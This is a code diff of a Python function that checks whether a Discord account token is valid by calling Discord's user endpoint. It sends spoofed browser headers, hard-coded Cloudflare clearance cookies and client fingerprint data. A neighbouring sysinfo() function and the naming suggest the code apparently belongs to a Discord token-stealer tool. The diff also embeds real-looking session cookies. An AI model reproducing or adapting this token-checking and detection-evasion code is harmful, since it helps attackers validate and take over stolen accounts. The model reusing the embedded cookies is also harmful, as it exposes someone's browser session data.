@@ -56,11 +56,12 @@ def sysinfo():
 def verifytks(token):
         headers = {
             "authority": "discord.com",
-            "Authorization": token,
+            "authorization": token,
             "Content-Type": "application/json",
             "accept": "*/*",
+            "Accept-Encoding": "gzip, deflate",
             "accept-language": "en-US,en;q=0.9",
-            "cookie": "__dcfduid=aac0334017a911f098842f23d84af171; __sdcfduid=aac0334117a911f098842f23d84af1715c6378665ed7cd80ba063fc1a62dcf56778f8b9a5aed615b6b2b87ad6e5d86dc; __cfruid=9a3b1e8892003974bfb9377d754094aa10c673ba-1744467793; _cfuvid=zWNJz3nNT38rNxvzC4SoAKylV6tgKOPzZLTYT4qLNNU-1744467793016-0.0.1.1-604800000; cf_clearance=LoW2_4j4UvTtzz3Aiuu3oK2W5NxiVXAYipg47Rzauzo-1744467803-1.2.1.1-CpA4qYnkf.rvAVDb6sYTOd4qdORu1Z58uoPvw7zJIHxAPOCRugXSyKJoGsOjKQhOajUHlEO2bwVUAM3OE3lW33HHPxu.BdIvwGnXMYDt8MiReUCoURR9jjPeWTB9zCXYsZzmB3uRYlz9CtyCir_TdgZdvu2vRvbgOjIE8SuS4l6EuRxLm4A1Uzmu.t2zuEyJ0sucFJz9JUw46mX2Hpwy0ljcsB5L8lNdzoPdbGVPw9Soe9LiEQzUGfkQZurc2rsfsDS5eNFUJ0gZnaGiVsg29UvVyjcjuP9t1e_IGzlHcGpgcb_X9t_vYAEZRDkjwxD9Wsmv6pl6sa0Mfn2hdEExb1xJey3GZkupTeIo2DucV6g",
+            "cookie": "__dcfduid=4aaaf410fabb11eeb9ed6f404016e883; __sdcfduid=4aaaf411fabb11eeb9ed6f404016e8836762363fa638d00a7ad427e08c03f23152d8f51abca0c1ca6dca5b2dd46b5592; __stripe_mid=efa51bfe-e638-4b84-ae01-413d55953112981224; _ga_Q149DFWHT7=GS1.1.1713297023.1.0.1713297023.0.0.0; _ga=GA1.1.710968384.1713297024; OptanonConsent=isIABGlobal=false&datestamp=Fri+Mar+28+2025+23%3A17%3A42+GMT-0400+(Eastern+Daylight+Time)&version=202501.2.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&AwaitingReconsent=false&isGpcEnabled=0&browserGpcFlag=0; _ga_YL03HBJY7E=GS1.1.1743218199.1.1.1743218324.0.0.0; _ga_5CWMJQ1S0X=GS1.1.1745033547.7.1.1745033900.0.0.0; cf_clearance=UIUwM7p.FUt3nqUR1CXzPjpHaRAJBTDzXQowDknncdA-1745093780-1.2.1.1-ome7yNBBJMzpNn3Pwwvixda4B5laFnX.V7oPjhWNoiOTqCJuZkYtBvSF1PLohU35BSSEPft8TsNmwLegvNFqg9WAZd9onhVjAnDQA0didIb.4PP6MiiMDOgsxHjEiIhz7Rz4zXTCUon7UP2Su0zU3kIVi6uYVrtSyVclPyElpuKMJdswRfSt3BkVUIDKEhHUO4140FRdLwPhZjItPLc8MJyoN8IG6RRNqyOohps4oX7LjlWq8imqaQZeg5yPKI1SkdKhTpqCXvkwVjqd7OoUYEmg..kbzffts5k66YyCCY9lGVZW5V44a4MdRTFr.JlUH6kCGUifvZpr_kN_0qjeXhKkEb7vnLTt73hxL3.hGmM; __cfruid=67b8978e7e7b78d0dd93cc6447495dfc41c4fbe4-1745100830; _cfuvid=SY2FabA7xdfnPP3998_Nqos50Hu2Q79AewcUtMqJ8AQ-1745100830513-0.0.1.1-604800000",
             "origin": "https://discord.com",
             "referer": "https://discord.com/channels/@me",
             "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
@@ -73,7 +74,7 @@ def verifytks(token):
             "x-discord-locale": "en-US",
             "x-discord-timezone": "America/New_York",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
-            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MTg4Iiwib3NfdmVyc2lvbiI6IjEwLjAuMjYxMDAiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJoYXNfY2xpZW50X21vZHMiOmZhbHNlLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBkaXNjb3JkLzEuMC45MTg4IENocm9tZS8xMzAuMC42NzIzLjE5MSBFbGVjdHJvbi8zMy40LjAgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjMzLjQuMCIsIm9zX3Nka192ZXJzaW9uIjoiMjYxMDAiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjozODkwMDQsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjYxNDQ0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
+            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM1LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjM5MTczOCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZX0==",
         }
 
         res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
